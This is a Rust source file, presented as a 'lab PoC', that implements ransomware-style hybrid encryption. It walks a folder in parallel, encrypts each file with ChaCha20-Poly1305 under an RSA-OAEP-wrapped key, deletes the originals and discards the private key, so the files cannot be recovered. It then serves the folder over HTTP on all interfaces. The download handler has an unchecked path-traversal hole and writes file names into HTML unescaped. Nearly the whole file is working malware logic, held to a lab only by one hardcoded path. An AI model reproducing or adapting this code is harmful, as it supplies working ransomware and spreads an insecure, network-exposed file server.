// Author: sdev
// Lab PoC dengan Local Web Server (Accessible via Public/LAN + Multithreading Rayon)

use chacha20poly1305::{
    aead::{Aead, KeyInit},
    ChaCha20Poly1305, Nonce,
};
use rand::RngCore;
use rayon::prelude::*; // Diperlukan untuk parallel iteration
use rsa::{Oaep, RsaPrivateKey, RsaPublicKey};
use sha2::Sha256;
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use tiny_http::{Server, Response, Header};
use walkdir::WalkDir;

fn generate_rsa_keys() -> (RsaPrivateKey, RsaPublicKey) {
    let mut rng = rand::thread_rng();
    let priv_key = RsaPrivateKey::new(&mut rng, 2048).expect("Gagal membuat RSA private key");
    let pub_key = RsaPublicKey::from(&priv_key);
    (priv_key, pub_key)
}

fn encrypt_file(file_path: &Path, pub_key: &RsaPublicKey) -> Result<(), Box<dyn std::error::Error>> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let mut key_bytes = [0u8; 32];
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut key_bytes);
    rand::thread_rng().fill_bytes(&mut nonce_bytes);

    let cipher = ChaCha20Poly1305::new_from_slice(&key_bytes)?;
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher.encrypt(nonce, buffer.as_ref())
        .map_err(|e| format!("Symmetric encryption error: {:?}", e))?;

    let mut rng = rand::thread_rng();
    let padding = Oaep::new::<Sha256>();
    let encrypted_key = pub_key.encrypt(&mut rng, padding, &key_bytes)?;

    let mut new_path = file_path.to_path_buf();
    let new_filename = format!("{}.enc", file_path.file_name().unwrap().to_str().unwrap());
    new_path.set_file_name(new_filename);

    let mut out_file = File::create(&new_path)?;
    out_file.write_all(&(encrypted_key.len() as u32).to_le_bytes())?;
    out_file.write_all(&encrypted_key)?;
    out_file.write_all(&nonce_bytes)?;
    out_file.write_all(&ciphertext)?;

    fs::remove_file(file_path)?;

    Ok(())
}

fn process_directory<F>(target_dir: &Path, action: F)
where
    F: Fn(&Path) -> Result<(), Box<dyn std::error::Error>> + Sync,
{
    // Mengumpulkan daftar file terlebih dahulu ke dalam Vector
    let files: Vec<PathBuf> = WalkDir::new(target_dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .map(|e| e.path().to_path_buf())
        .filter(|path| path.is_file() && !path.to_str().unwrap().ends_with(".enc"))
        .collect();

    // Memproses file secara paralel menggunakan multithreading dari Rayon
    files.par_iter().for_each(|path| {
        if let Err(e) = action(path) {
            eprintln!("[-] Gagal memproses file {:?}: {}", path, e);
        }
    });
}

fn main() {
    let target_folder = PathBuf::from("./lab_test_folder");
    if !target_folder.exists() {
        fs::create_dir_all(&target_folder).unwrap();
        let sample_file = target_folder.join("sample_lab.txt");
        let mut f = File::create(sample_file).unwrap();
        writeln!(f, "Author: sdev - Hybrid Crypto Lab Verification File").unwrap();
    }

    println!("[+] Menghasilkan kunci RSA...");
    let (_, pub_key) = generate_rsa_keys();

    println!("[+] Menjalankan enkripsi paralel pada direktori: {:?}", target_folder);
    process_directory(&target_folder, |path| {
        encrypt_file(path, &pub_key)
    });

    let server_addr = "0.0.0.0:8080";
    let server = Server::http(server_addr).expect("Gagal menjalankan server, pastikan port 8080 tersedia.");

    println!("\n[+] PoC Lab Berjalan di Publik/Jaringan!");
    println!("[+] Silakan akses melalui:");
    println!("    -> http://<IP_KOMPUTER_ANDA>:8080");
    println!("    -> Atau http://127.0.0.1:8080 (Lokal)");
    println!("[*] Tekan CTRL+C untuk menghentikan server.");

    for request in server.incoming_requests() {
        let url = request.url().to_string();
        
        if url == "/" || url == "" {
            let mut html = String::from("<h2>Lab PoC - File Terenkripsi</h2><p>Daftar file hasil simulasi:</p><ul>");
            
            if let Ok(entries) = fs::read_dir(&target_folder) {
                for entry in entries.flatten() {
                    let p = entry.path();
                    let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
                    if p.is_file() && !name.is_empty() {
                        html.push_str(&format!("<li><a href=\"/download?file={}\">{}</a></li>", name, name));
                    }
                }
            }
            html.push_str("</ul>");

            let response = Response::from_string(html)
                .with_header(Header::from_bytes(&b"Content-Type"[..], &b"text/html; charset=utf-8"[..]).unwrap());
            let _ = request.respond(response);
        } else if url.starts_with("/download?file=") {
            let filename = url.replace("/download?file=", "");
            let file_path = target_folder.join(filename);

            if file_path.exists() {
                if let Ok(file) = File::open(&file_path) {
                    let response = Response::from_file(file);
                    let _ = request.respond(response);
                } else {
                    let _ = request.respond(Response::from_string("Gagal membaca file.").status_code(500));
                }
            } else {
                let _ = request.respond(Response::from_string("File tidak ditemukan.").status_code(404));
            }
        } else {
            let _ = request.respond(Response::from_string("404 Not Found").status_code(404));
        }
    }
}
